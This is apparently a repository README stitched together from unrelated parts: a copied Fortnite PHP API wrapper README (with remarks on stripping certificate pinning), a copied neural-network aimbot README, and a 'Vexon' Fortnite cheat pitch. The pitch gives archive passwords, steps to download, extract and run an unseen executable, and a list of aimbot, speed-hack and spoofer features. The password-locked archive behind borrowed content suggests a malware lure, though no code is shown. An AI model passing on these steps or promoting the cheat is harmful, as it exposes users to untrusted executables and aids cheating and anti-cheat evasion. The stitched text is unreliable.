# WinRar Password: kol2233

# Fortnite-PHP Wrapper
Interact with the official Fortnite API using PHP.

[![Packagist](https://img.shields.io/packagist/l/doctrine/orm.svg)]()
[![Packagist](https://img.shields.io/packagist/v/Tustin/fortnite-php.svg)]()

## Installation
Pull in the project using composer:
`composer require Tustin/fortnite-php`

## Usage
Create a basic test script to ensure everything was installed properly
```php
<?php

require_once 'vendor/autoload.php';

use Fortnite\Auth;
use Fortnite\Account;
use Fortnite\Mode;
use Fortnite\Language;
use Fortnite\Platform;

// Authenticate
$auth = Auth::login('epic_email@domain.com','password');

// Output each stat for all applicable platforms
var_dump($auth->profile->stats);

// Grab someone's stats
$sandy = $auth->profile->stats->lookup('sandalzrevenge');
echo 'Sandy Ravage has won ' . $sandy->pc->solo->wins . ' solo games and ' . $sandy->pc->squad->wins . ' squad games!';
```

### Get Leaderboards
```php
$auth = Auth::login('epic_email@domain.com','password');
var_dump($auth->leaderboard->get(Platform::PC, Mode::DUO)); 

```

### Get News 
```php
$auth = Auth::login('epic_email@domain.com','password');
var_dump($auth->news->get(News::BATTLEROYALE, Language::ENGLISH)); 
```



### Get Store
```php
$auth = Auth::login('epic_email@domain.com','password');
var_dump($auth->store->get(Language::ENGLISH)); 
```

### Get Challenges
```php
$auth = Auth::login('epic_email@domain.com','password');
// All weekly challenges
var_dump($auth->profile->challenges->getWeeklys()); 

// Or just get a specific week (in this example, week 1)
var_dump($auth->profile->challenges->getWeekly(1)); 
```

### Constants
```
Platform [ PC, PS4, XB1 ]

Mode [ SOLO, DUO, SQUAD ]

Language [ ENGLISH, GERMAN, SPANISH, CHINESE, FRENCH, ITALIAN, JAPANESE ]

News [ BATTLEROYALE, SAVETHEWORLD ]
```

## Contributing
Fortnite now utilizes SSL certificate pinning in their Windows client in newer versions. I suggest using the iOS mobile app to do any future API reversing as both cheat protections on the Windows client make it difficult to remove the certificate pinning. If SSL certificate pinning is added to the iOS version, I could easily provide a patch to remove that as the iOS version doesn't contain any anti-cheat.

# Lunar
Lunar is a neural network aim assist that uses real-time object detection accelerated with CUDA on Nvidia GPUs.

## About

Lunar can be modified to work with a variety of FPS games; however, it is currently configured for Fortnite. Besides being general purpose, the main advantage of using Lunar is that it does meddle with the memory of other processes.

The basis of Lunar's player detection is the [YOLOv5](https://github.com/ultralytics/yolov5) architecture written in PyTorch.

A demo video (outdated) can be found [here](https://www.youtube.com/watch?v=XDAcQNUuT84).

![thumbnail](https://user-images.githubusercontent.com/45726273/126563920-193ca8df-de70-4a91-81ec-d781ee961332.png)

## Installation

1. Install a version of [Python](https://www.python.org/downloads/) 3.8 or later.

2. Navigate to the root directory. Use the package manager [pip](https://pip.pypa.io/en/stable/) to install the necessary dependencies.

```
pip install -r requirements.txt
```

## Usage
```           
python lunar.py
```
To update sensitivity settings:
```           
python lunar.py setup
```
To collect image data for annotating and training:
```           
python lunar.py collect_data
```


## Issues
- The method of mouse movement ([SendInput](https://github.com/zeyad-mansour/Lunar/blob/45e05373036f8bd072667313c155e55735cd7f57/lib/aimbot.py#L126)) is slow. For this reason, the crosshair often lags behind a moving detection. This problem can be lessened by increasing the [pixel_increment](https://github.com/zeyad-mansour/Lunar/blob/45e05373036f8bd072667313c155e55735cd7f57/lib/aimbot.py#L56) (e.g. to 4) so fewer calls to that function are made.
- False positives can also happen under certain lighting conditions.

## Contributing
Pull requests are welcome. If you have any suggestions, questions, or find any issues, please open an [issue](https://github.com/zeyad-mansour/Lunar/issues) and provide some detail.
If you find this project interesting or helpful, please star the repository.

## License
This project is distributed under [GNU General Public License v3.0](https://github.com/zeyad-mansour/Lunar/blob/main/LICENSE) license.

# Vexon Fortnite External Cheat

### Password to extract files: 2233

## Best Undetected cheat for Fortnite with 150+ features with BUILT IN SPOOFER

## How to use? 

1. Download this repository by clicking on CODE > DOWNLOAD ZIP

2. Open .zip file that you downloaded from this repository and extract everything to Desktop. 

3. Open cheat

4. Open Fortnite and press Attach in the software.

5. In game, press F11 or INSERT to open Main Menu.

# Features: 

## Aimbot:

- Weapon Selection

- Memory Aim

- On Key (On/Off)

- Silent Aim (P Silent)

- Aim Bones (Head) (Neck) (Body) (Closest)

- No Recoil

- Knocked Players

- Backtrack

- Visibles Check

- Smooth (1-10)

- FOV (1-100)

## Visuals:

- On Key (On/Off)

- Player Names

- Player Distance

- Itmes

- Health Bar (Constant) (Normal)

- Health Text

- Bounding Box (3D) (2D)

- Outlines (Above) (Below) (Crosshair)

- Color Mates

- Color Picker

## Misc/Exploits:

- Spin Bot (Rage)

- Fly (On Key) (On/Off) (Risky)

- Speed Hack (On Key) (1-5) (Risky)

- Boat Fly

- Auto Heal

- Crosshair (Custom) (Color Picker)

- Ingame FPS

- Can Jump

- Instant Reload

- Warzone

- FOV Changer

- Hitbox Extender

- Rapid Fire

- Air Stuck

- Car Fly

- Spoof Username

## Stream Proof:

- OBS Studio

- Xbox Gamebar

- Nvidia



## Preview:

![xcsd](https://user-images.githubusercontent.com/113072836/189179055-aad3c0d4-e7e0-49b8-87f8-dd58cb0529f1.png)
![xcsd](https://user-images.githubusercontent.com/113072836/189178959-96ed2d52-8caf-4d77-8216-9016b7cfb478.png)
![xcsd](https://user-images.githubusercontent.com/113072836/189178621-b758f6ee-0b90-474c-bd15-7cc478911236.png)
![xcsd](https://user-images.githubusercontent.com/113072836/189178756-8f827f1f-caf4-413e-9402-ac215366b8b7.png)